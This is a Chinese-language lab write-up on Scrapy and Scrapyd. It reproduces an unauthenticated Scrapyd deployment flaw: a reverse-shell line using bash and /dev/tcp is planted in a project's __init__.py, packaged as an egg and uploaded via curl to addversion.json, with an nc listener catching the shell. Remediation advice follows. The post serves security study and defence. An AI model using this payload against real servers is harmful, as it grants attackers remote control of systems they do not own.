## 1、Scrapy框架

再聊scrapyd之前，先认识一下scrapy，scrapy是一个爬虫框架，Scrapy是适用于Python的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动化测试。

参考链接：[https://baijiahao.baidu.com/s?id=1706598239137694865𝔴=spider&for=pc](https://baijiahao.baidu.com/s?id=1706598239137694865&wfr=spider&for=pc)

## 2、Scrapyd介绍及使用

参考链接：<https://mp.weixin.qq.com/s/9MVXAYSGEqLsbLtgO0v90Q>

### 1、简介

scrapyd是一个云服务，用户可以将自己用scrapy框架开发的爬虫上传到云端，然后通过Web API调用这个爬虫爬取信息。

### 2、安装

pip install scrapyd

![1660901116_62ff56fc0e8525644fc0e.png!small?1660901116813](https://image.3001.net/images/20220819/1660901116_62ff56fc0e8525644fc0e.png!small?1660901116813)

### 3、运行

切换到任意盘符任意目录下，输入scrapyd，服务即可运行，如下图![1660901200_62ff5750d3796ef5391b1.png!small?1660901201942](https://image.3001.net/images/20220819/1660901200_62ff5750d3796ef5391b1.png!small?1660901201942)

启动后访问http://127.0.0.1:6800即可看到主页

![1660901213_62ff575d5d8f424a424f1.png!small?1660901214604](https://image.3001.net/images/20220819/1660901213_62ff575d5d8f424a424f1.png!small?1660901214604)

### 4、重要文件及目录说明

1、default_scrapyd.conf

![1660901236_62ff577497b1ff06b116e.png!small](https://image.3001.net/images/20220819/1660901236_62ff577497b1ff06b116e.png!small)

default_scrapyd.conf配置文件里面存放着监听的ip地址、端口信息，以及对应的api信息，如下图

![1660901290_62ff57aaa562c7dcb5ac6.png!small?1660901292762](https://image.3001.net/images/20220819/1660901290_62ff57aaa562c7dcb5ac6.png!small?1660901292762)

2、webservice.py文件

![1660901305_62ff57b9496cf29605cbb.png!small?1660901306357](https://image.3001.net/images/20220819/1660901305_62ff57b9496cf29605cbb.png!small?1660901306357)

由此可知，scrapyd主要提供以下一些API：

/daemonstatus.json 获取云服务的状态

/addversion.json 上传一个新的爬虫项目，或者给一个已有的项目更新代码

/schedule.json 执行一个爬取任务

/cancel.json 停止并取消一个任务

/listprojects.json 列出云端的所有项目

/listversions.json 列出某个项目的所有代码版本

/listspiders.json
列出一个项目下所有spider，spider这个概念是scrapy框架中的，一个scrapy开发的爬虫可以有多个spider

/listjobs.json 列出所有任务，包括正在进行的、已完成的、等待执行的三个状态

/delversion.json 删除某个项目下的某个代码版本

/delversion.json 删除某个项目

### 5、项目发布(本地演示)

scrapyd云服务下可以有多个项目，每个项目下可以有多个代码版本，每个代码版本就是一个完整的scrapy项目，一个scrapy项目下可以有多个spider，最终执行的任务的载体是一个spider。当我们刚安装运行scrapyd的时候，是没有项目的，可以输入<http://127.0.0.1:6800/listprojects.json>进行查看，如下图

![1660901341_62ff57dd38131fbd09442.png!small?1660901341995](https://image.3001.net/images/20220819/1660901341_62ff57dd38131fbd09442.png!small?1660901341995)

1、创建scrapy项目

scrapy startproject hack

**![1660901353_62ff57e9b06be4d2b5cc3.png!small?1660901354484](https://image.3001.net/images/20220819/1660901353_62ff57e9b06be4d2b5cc3.png!small?1660901354484)**

2、上传

 **部署主要分为两步：**

#### 1、将项目打包成egg

 **使用模块Scrapyd-client中的scrapyd-deploy功能**

关于Scrapyd-client介绍：

Scrapyd-client is a client for Scrapyd. It provides the general scrapyd-client
and the scrapyd-deploy utility which allows you to deploy your project to a
Scrapyd server.

 **Scrapy-client** **安装**

pip install scrapyd-client

 **部署** ：在项目目录下，即scrapy.cfg所在的目录下运行

scrapyd-deploy --build-egg=项目名称.egg

**![1660901397_62ff58151c95dc5d879ad.png!small?1660901397901](https://image.3001.net/images/20220819/1660901397_62ff58151c95dc5d879ad.png!small?1660901397901)**

#### 2、将egg通过Scrapyd的addversion.json接口上传到目标服务器

 **官方的部署上传接口文档：**

 **<https://scrapyd.readthedocs.io/en/latest/api.html#addversion-json>**

![1660901417_62ff5829e19eaf38bb212.png!small?1660901418893](https://image.3001.net/images/20220819/1660901417_62ff5829e19eaf38bb212.png!small?1660901418893)

 **命令:**

curl http://127.0.0.1:6800/addversion.json -F project=hack -F version=r23 -F
[egg=@hack.egg](mailto:egg=@hack.egg)

**![1660901431_62ff58373a5158d7b7a7f.png!small?1660901431999](https://image.3001.net/images/20220819/1660901431_62ff58373a5158d7b7a7f.png!small?1660901431999)**

 **再次访问**<http://127.0.0.1:6800/listprojects.json> **即可看到刚刚上传的项目名称。**

## 3、漏洞简介

通过以上可知scrapyd是爬虫框架scrapy提供的云服务，用户可以部署自己的scrapy包到云服务，默认监听在6800端口。如果攻击者能访问该端口，将可以部署恶意代码到服务器，进而获取服务器权限。

## 4、漏洞复现

环境搭建：

攻击机器：宿主机windows(192.168.100.88)，受害机器：虚拟机kali(192.168.88.131)

Python版本：3.8

（1）在受害机器虚拟机kali上安装scrapyd，并且运行，如下图：

![1660901479_62ff58673cfe14a4c66db.png!small?1660901480027](https://image.3001.net/images/20220819/1660901479_62ff58673cfe14a4c66db.png!small?1660901480027)

我们需要用攻击机来完成此实验，因此需要找到default_scrapyd.conf文件修改监听地址，使攻击机能够访问

![1660901494_62ff587655277996ff142.png!small?1660901495410](https://image.3001.net/images/20220819/1660901494_62ff587655277996ff142.png!small?1660901495410)

:wq 退出保存

重新运行scrapyd即可看到修改后的ip地址

![1660901513_62ff5889432fc5abaa06b.png!small?1660901514023](https://image.3001.net/images/20220819/1660901513_62ff5889432fc5abaa06b.png!small?1660901514023)

在攻击机上(ip:192.168.100.88)，输入受害者机器的ip和端口即可看到Scrapyd的界面

![1660901549_62ff58ad0530a548b95fb.png!small?1660901550070](https://image.3001.net/images/20220819/1660901549_62ff58ad0530a548b95fb.png!small?1660901550070)

 **(2)在攻击机上安装scrapy框架，并创建一个scrapy项目：**

pip install scrapy

scrapy startproject evil

 **生成了项目后，我们在evil/__init__.py中加入反弹shell代码：**

import os

os.system('bash -i >& /dev/tcp/192.168.100.88/9999 0>&1')

![1660901618_62ff58f237e6145fbdbce.png!small?1660901618983](https://image.3001.net/images/20220819/1660901618_62ff58f237e6145fbdbce.png!small?1660901618983)

 **然后，我们用scrapyd-client这个工具，将项目打包成egg包。**

pip install scrapyd-client

scrapyd-deploy --build-egg=evil.egg

![1660901630_62ff58fee268b5622e1e1.png!small?1660901631611](https://image.3001.net/images/20220819/1660901630_62ff58fee268b5622e1e1.png!small?1660901631611)

 **攻击机本地监听9999端口**

nc -lvnp 9999

![1660901659_62ff591b41f704efa91ae.png!small?1660901660185](https://image.3001.net/images/20220819/1660901659_62ff591b41f704efa91ae.png!small?1660901660185)

 **此时，恶意的egg包已经生成，然后我们将其部署到云端：**

curl http://192.168.88.131:6800/addversion.json -F project=evil -F version=r01
-F [egg=@evil.egg](mailto:egg=@evil.egg) **可以看到攻击机反弹过来的shell**

![1660901684_62ff5934627d6745581af.png!small?1660901685170](https://image.3001.net/images/20220819/1660901684_62ff5934627d6745581af.png!small?1660901685170)

## 5、漏洞修复

 **1、对scrapyd访问启动用户密码认证**

 **2、禁止对外网开放，仅限于内部访问**

 **3、添加IP访问限制，并更改默认6800端口**

## 6、实验过程可能会出现的报错

1、builtins.ModuleNotFoundError: No module named '_sqlite3'

报错解决参考链接：<https://www.cnblogs.com/hd92/p/15874168.html>

2、报错解决sh: 1: Syntax error: Bad fd number

报错解决参考链接：<http://blog.chinaunix.net/uid-30199261-id-5849127.html>

